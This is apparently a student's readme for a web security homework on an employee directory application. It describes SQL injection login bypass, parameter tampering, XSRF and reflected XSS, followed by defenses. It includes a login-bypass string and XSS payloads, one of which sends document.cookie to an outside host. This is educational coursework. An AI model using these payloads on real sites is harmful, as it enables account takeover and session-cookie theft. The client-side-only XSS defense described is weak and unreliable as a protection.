/******* WEB APPLICATION SECURITY - EXPLOITS AND DEFENSES ********/
This readme.txt describes the following:
1)Description of each section of the homework

Preferable browser for testing- Firefox

Description
------------
PART I: The application assigned to me was employee directory. This application essentially has two kinds of users-Admin(level 3) and General User(level 0). General user can only view the employee list in the Home page. He can also view a particular employee details. Admin has privileges to update,delete and insert employee records. He can also update, insert and delete departments.



PART II: For authentication, the browser associates each session with a cookie. Apart from this I have used session attributes namely session["UserID"], session["UserLevel"] and session["DeptID"]. Session variables are set after successful login and reset to null after logout. In every critical page the checkSecurity() method is called which checks whether session variables are set or not and grants access to resources based on the level of user.



PART III: 
SQL Injection : I have shown SQL injection attack at the login screen. Since username is not sanitised, it is vulnerable and a string like "admin' -- " can exploit it. The SQL query (select * from emps where login='login' and password='password') then becomes (SELECT * from emps where login='admin'--). The password is not checked and the attacker is able to log in.

Parameter Tampering : I have shown parameter tampering while deleting departments. For deleting department, the user clicks on a department name and deletes it. The request is a GET request with the query parameter dep_id. Since it's a GET request, this is vulnerable. I modified the dep_id in the URL and deleted a department which was not intended.

XSRF: I have shown XSRF by sending request to the target application from the attacker site. This is possible only if user of the target site has logged in and his session is active. First login as admin in the employee directory application. Then open another tab in the same browser and type URL http://calculus.sisl.rites.uic.edu:443/5f3decd5/XSRF.jsp. It will be seen that an extra department has been added to the list without the admin's knowledge.

XSS: User input fields are not sanitized hence are vulnerable to XSS attacks. An attacker enters a javascript executable in the input field which causes malicious action. 
I have used reflective XSS in this case. The user of the vulnerable site is required to open the attacker's site and click on an image. Each image has an underlying href and clicking on them sends a malicious request to employee directory application. 
A)Alert - Click on image 1. Alert pop up appears.
B)Defacement - Click on image 2. Page title will change.
C)Cookie theft - Click on image 3 and notice URL.


PART IV:
SQL Injection defense: I modified the code such that attacker cannot change the SQL query structure. A better approach would be to use prepared statements.

Parameter Tampering defense: I have used session["DeptID"] to check if the department being deleted is the actual one that's selected. 

XSRF: 

XSS defense: I have used input validation on the client side so that user is prevented from entering malicious script or unwanted characters.This can be tested by directly giving the script input at the textbox field. 

In empldir/empldirFix/Default.jsp type the following:
email- 1)<script>alert("XSS Attack")</script>
2)<script>document.title="Employee Directory jneela2"</script>
3)<script>window.open("http://calculus.sisl.rites.uic.edu/5f3decd5/XSSAttackThwart.jsp?cookie="+document.cookie)</script>


